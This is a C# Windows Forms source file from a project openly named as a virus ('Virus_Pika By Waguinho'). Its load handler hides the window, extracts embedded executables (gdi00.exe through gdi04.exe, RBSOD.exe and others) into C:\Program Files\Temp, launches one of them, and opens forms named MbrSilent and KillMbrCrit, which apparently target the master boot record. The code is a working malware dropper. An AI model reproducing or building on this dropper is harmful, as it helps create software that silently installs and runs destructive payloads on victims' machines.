using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Virus_Pika__By_Waguinho_
{
    public partial class LoadCheck : Form
    {
        public LoadCheck()
        {
            InitializeComponent();
        }

        public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
           

            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }

        private async void LoadCheck_Load(object sender, EventArgs e)
        {
            this.Hide();

            Directory.CreateDirectory(@"C:\Program Files\Temp");

            if (!File.Exists(@"c:\Program Files\pika.exe"))
            {
                Extract("Virus_Pika__By_Waguinho_", @"c:\Program Files\Temp", "Resources", "Pika.exe");
                Extract("Virus_Pika__By_Waguinho_", @"c:\Program Files\Temp", "Resources", "chk.exe");
                Extract("Virus_Pika__By_Waguinho_", @"c:\Program Files\Temp", "Resources", "fcls.exe");
                Extract("Virus_Pika__By_Waguinho_", @"c:\Program Files\Temp", "Resources", "fiufiu.wav");
                Extract("Virus_Pika__By_Waguinho_", @"c:\Program Files\Temp", "Resources", "gdi00.exe");
                Extract("Virus_Pika__By_Waguinho_", @"c:\Program Files\Temp", "Resources", "gdi01.exe");
                Extract("Virus_Pika__By_Waguinho_", @"c:\Program Files\Temp", "Resources", "gdi02.exe");
                Extract("Virus_Pika__By_Waguinho_", @"c:\Program Files\Temp", "Resources", "gdi03.exe");
                Extract("Virus_Pika__By_Waguinho_", @"c:\Program Files\Temp", "Resources", "gdi04.exe");
                Extract("Virus_Pika__By_Waguinho_", @"c:\Program Files\Temp", "Resources", "icon.ico");
                Extract("Virus_Pika__By_Waguinho_", @"c:\Program Files\Temp", "Resources", "music.wav");
                Extract("Virus_Pika__By_Waguinho_", @"c:\Program Files\Temp", "Resources", "RBSOD.exe");
                Extract("Virus_Pika__By_Waguinho_", @"c:\Program Files\Temp", "Resources", "sound.exe");
                Extract("Virus_Pika__By_Waguinho_", @"c:\Program Files\Temp", "Resources", "sus.jpg");
                Extract("Virus_Pika__By_Waguinho_", @"c:\Program Files\Temp", "Resources", "zapzap.wav");

            }

            if (File.Exists(@"c:\Program Files\temp\brkrules.msi") == true)
            {
                KillMbrCrit killcrit = new KillMbrCrit();
                killcrit.Show();
            }

            if (File.Exists(@"C:\Program Files\Temp\Check.ini") == false)
            {
                Tela_inicial ini = new Tela_inicial();
                ini.Show();
            }
            else
            {
                File.Create(@"c:\Program Files\temp\brkrules.msi");
                
                Process.Start(@"c:\Program Files\Temp\gdi00.exe");

                MbrSilent mbr = new MbrSilent();
                mbr.Show();

                PikaVirus02 pika02 = new PikaVirus02();
                pika02.Show();
                VirusPika03 virusPika03 = new VirusPika03();
                virusPika03.Show();
                janelapika janelapika = new janelapika();
                janelapika.ShowDialog();
                
                
            }
        }
    }
}
